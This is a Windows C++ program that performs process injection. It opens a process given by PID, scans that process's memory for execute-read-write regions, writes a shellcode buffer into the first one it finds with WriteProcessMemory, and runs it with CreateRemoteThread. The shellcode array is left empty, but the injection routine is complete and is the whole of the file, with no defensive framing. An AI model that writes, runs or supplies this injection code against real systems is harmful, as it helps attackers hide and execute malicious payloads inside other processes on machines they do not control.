#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <tlhelp32.h>
#include <stdlib.h>  

int main(int argc, char* argv[]) {
    // Var declaration
    MEMORY_BASIC_INFORMATION peMem; // struct with process memory info
    PROCESSENTRY32 pe; // struct with process info
    HANDLE hPe = NULL; // process
    HANDLE hPeSnapshot; // snapshot
    BOOL hResult; 
    pe.dwSize = sizeof(PROCESSENTRY32); // size of the structure

    DWORD pid = atoi(argv[1]); // target proc id

    unsigned char shellcode[] = ""; 

    // Take snapshot of all running processes 
    hPeSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hPeSnapshot) return -1; // must handle this exception or else
    hResult = Process32First(hPeSnapshot, &pe); // Check that the first process in the snapshot is valid

    int flag = 0;
    LPVOID addr = 0; 
    while (hResult) {
        hPe = OpenProcess(MAXIMUM_ALLOWED, false, (DWORD)pid); // target PID
        if (hPe) {
            while (VirtualQueryEx(hPe, addr, &peMem, sizeof(peMem))) { // query process memory in chunks
                addr = (LPVOID)((DWORD_PTR)peMem.BaseAddress + peMem.RegionSize); // increment the addr we start at for the next chunk 
                if (peMem.AllocationProtect == PAGE_EXECUTE_READWRITE) { // if memory is RWX
                    printf("Found RWX region at 0x%x\n", peMem.BaseAddress);
                    printf("Inject shellcode?\n");
                    system("pause");

                    // Write shellcode to the process memory region
                    WriteProcessMemory(hPe, peMem.BaseAddress, shellcode, sizeof(shellcode), NULL); 
                    printf("\nShellcode injected!\n");
                    printf("Execute shellcode?\n");
                    system("pause");

                    // Run shellcode remotely 
                    CreateRemoteThread(hPe, NULL, NULL, (LPTHREAD_START_ROUTINE)peMem.BaseAddress, NULL, NULL, NULL); // create thread run shellcode 
                    
                    // break
                    flag = 1;
                    break;
                }

            }

        }
        if (flag == 1) {
            break;
        }
    }
    // cleanup
    CloseHandle(hPeSnapshot);
    CloseHandle(hPe);
    return 0;

}
